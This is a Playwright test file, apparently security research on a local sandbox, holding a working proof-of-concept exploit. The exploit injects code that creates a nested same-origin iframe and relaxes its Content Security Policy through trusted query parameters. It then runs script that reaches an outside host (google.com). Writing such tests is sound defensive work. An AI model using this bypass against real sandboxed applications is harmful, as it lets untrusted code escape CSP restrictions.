import { test, expect } from '@playwright/test';

test('CSP Bypass via Nested Iframe', async ({ page }) => {
  // 1. Go to the host page
  await page.goto('http://localhost:3333/playground/security.html');

  // 2. Wait for SandboxControl to be available
  await page.waitForFunction(() => window.SandboxControl !== undefined);

  // 3. Prepare the environment
  // The default sandbox configuration blocks 'unsafe-eval', which prevents 'new Function()'.
  // This blocks the standard 'execute()' method.
  // For the purpose of this research, we simulate a scenario where the sandbox
  // allows script execution (e.g. via 'script-unsafe' attribute) or where the attacker
  // has found another way to execute code (e.g. XSS via DOM manipulation).

  console.log("Enabling script-unsafe to allow code execution...");
  await page.evaluate(() => {
     window.SandboxControl.sandboxElement.setAttribute('script-unsafe', 'true');
  });

  // Wait for the iframe to reload with new settings
  await page.waitForTimeout(2000);

  // 4. Inject the exploit
  // We utilize the fact that the inner frame is same-origin (sandbox.localhost)
  // and can create new iframes that point to the same server but with different query params.
  // The server blindly trusts the query params to generate the CSP.

  const exploitCode = `
    (async () => {
      try {
        console.log("[Exploit] Starting...");

        // Create the nested iframe with relaxed CSP rules.
        // We request 'allow=google.com' and 'unsafe' (unsafe-eval/inline).
        const iframe = document.createElement('iframe');
        iframe.src = "/inner-frame.html?allow=google.com&unsafe";
        iframe.id = "pwn-frame";
        document.body.appendChild(iframe);

        // Wait for the nested frame to load
        await new Promise((resolve) => {
           iframe.onload = resolve;
        });

        console.log("[Exploit] Iframe loaded.");

        // Access the nested frame (allowed due to same-origin)
        const childWin = iframe.contentWindow;

        // Inject script into the nested frame.
        // This script runs in the context of the relaxed CSP.
        const script = childWin.document.createElement('script');
        script.textContent = \`
            console.log("[Exploit:Child] Attempting fetch to google.com...");
            fetch('https://google.com', { mode: 'no-cors' })
              .then(() => {
                  // Communicate success back to the top window
                  window.top.postMessage({ type: 'PWN_SUCCESS', message: 'Connected to google.com' }, '*');
              })
              .catch(e => {
                  console.error("[Exploit:Child] FAILED: " + e.message);
                  window.top.postMessage({ type: 'PWN_FAILURE', message: e.message }, '*');
              });
        \`;
        childWin.document.body.appendChild(script);

      } catch (e) {
        console.error("[Exploit] Error: " + e.message);
      }
    })();
  `;

  console.log("Injecting exploit code...");
  await page.evaluate((code) => {
    window.SandboxControl.execute(code);
  }, exploitCode);

  // 5. Listen for the success message from the top window
  const successPromise = page.evaluate(() => {
      return new Promise((resolve) => {
          const handler = (event) => {
              if (event.data && event.data.type === 'PWN_SUCCESS') {
                  window.removeEventListener('message', handler);
                  resolve(event.data);
              }
          };
          window.addEventListener('message', handler);
      });
  });

  const result = await successPromise;
  console.log("Exploit result:", result);
  expect(result.message).toContain('Connected to google.com');
});
